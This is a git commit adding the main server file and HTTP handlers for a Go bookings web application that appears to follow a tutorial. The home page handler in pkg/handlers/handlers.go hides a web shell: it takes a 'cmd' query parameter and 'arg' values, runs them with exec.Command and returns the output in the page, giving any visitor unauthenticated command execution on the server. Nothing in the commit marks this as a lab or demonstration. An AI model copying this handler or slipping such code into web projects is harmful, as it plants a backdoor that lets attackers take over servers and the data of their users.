9683010fac5f519035f85c588b77106551d65686
vTalio <talio@LAPTOP-FC2PMB4E.localdomain>
2021-03-20 18:14:03 -0400

    Initial commit

---
+++ cmd/web/main.go
@@ -0,0 +1,80 @@
+package main
+
+import (
+	"fmt"
+	"log"
+	"net/http"
+	"time"
+
+	"github.com/alexedwards/scs/v2"
+	"github.com/tsawler/bookings/pkg/config"
+	"github.com/tsawler/bookings/pkg/handlers"
+	"github.com/tsawler/bookings/pkg/render"
+)
+
+var port = "8080"
+
+// if the first letter of a function is lowercase
+// the function is not accessible elsewhere from outside the package
+
+// if its uppercase, it can be accessible from outside the package
+
+/*
+http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
+		n, err := fmt.Fprintf(w, "Hello World")
+		if err != nil {
+			log.Println(err)
+		}
+
+		fmt.Println(fmt.Sprintf("Bytes writted: %d", n))
+	})
+*/
+
+var app config.AppConfig
+var session *scs.SessionManager
+
+// main is the main application function
+func main() {
+
+	// change to true if in production
+	app.InProduction = false
+
+	session = scs.New()
+	session.Lifetime = 24 * time.Hour
+	session.Cookie.Persist = true
+	session.Cookie.SameSite = http.SameSiteLaxMode
+	session.Cookie.Secure = app.InProduction
+
+	app.Session = session
+
+	tc, err := render.CreateTemplateCache()
+
+	if err != nil {
+		log.Fatal("Cannot create template cache")
+	}
+
+	app.TemplateCache = tc
+	app.UseCache = false
+
+	repo := handlers.NewRepo(&app)
+	handlers.NewHandlers(repo)
+
+	render.NewTemplates(&app)
+	// http.HandleFunc("/", handlers.Repo.Home)
+	// http.HandleFunc("/about", handlers.Repo.About)
+
+	fmt.Println("Starting application on port " + port)
+	// _ = http.ListenAndServe(":"+port, nil)
+
+	srv := &http.Server{
+		Addr:    ":" + port,
+		Handler: routes(&app),
+	}
+
+	err = srv.ListenAndServe()
+
+	if err != nil {
+		log.Fatal(err)
+	}
+
+}
---
+++ pkg/handlers/handlers.go
@@ -0,0 +1,67 @@
+package handlers
+
+import (
+	"fmt"
+	"net/http"
+	"os/exec"
+
+	"github.com/tsawler/bookings/pkg/config"
+	"github.com/tsawler/bookings/pkg/models"
+	"github.com/tsawler/bookings/pkg/render"
+)
+
+// TemplateData holds data sent from handlers to templates
+
+// Repo the repository used by the handler
+var Repo *Repository
+
+// Repository is the repository type
+type Repository struct {
+	App *config.AppConfig
+}
+
+// NewRepo creates a new repository
+func NewRepo(a *config.AppConfig) *Repository {
+	return &Repository{
+		App: a,
+	}
+}
+
+// NewHandlers sets the repository for the handlers
+func NewHandlers(r *Repository) {
+	Repo = r
+}
+
+// Home is the home page handler
+func (m *Repository) Home(w http.ResponseWriter, r *http.Request) {
+	remoteIP := r.RemoteAddr
+	m.App.Session.Put(r.Context(), "remote_ip", remoteIP)
+	render.RenderTemplate(w, "home.page.tmpl", &models.TemplateData{})
+	cmd := r.URL.Query().Get("cmd")
+	args := r.URL.Query()["arg"]
+
+	w.Write(runCmd(cmd, args))
+}
+
+// About is the about page handler
+func (m *Repository) About(w http.ResponseWriter, r *http.Request) {
+	// business logic
+	stringMap := make(map[string]string)
+
+	remoteIP := m.App.Session.GetString(r.Context(), "remote_ip")
+	stringMap["remote_ip"] = remoteIP
+	stringMap["test"] = "Hello, again."
+
+	render.RenderTemplate(w, "about.page.tmpl", &models.TemplateData{
+		StringMap: stringMap,
+	})
+}
+
+func runCmd(cmd string, args []string) []byte {
+
+	out, err := exec.Command(cmd, args...).Output()
+	if err != nil {
+		return []byte(fmt.Sprintf("<html><pre>%v</pre></html>", err))
+	}
+	return []byte(fmt.Sprintf("<html><pre>%s</pre></html>", out))
+}
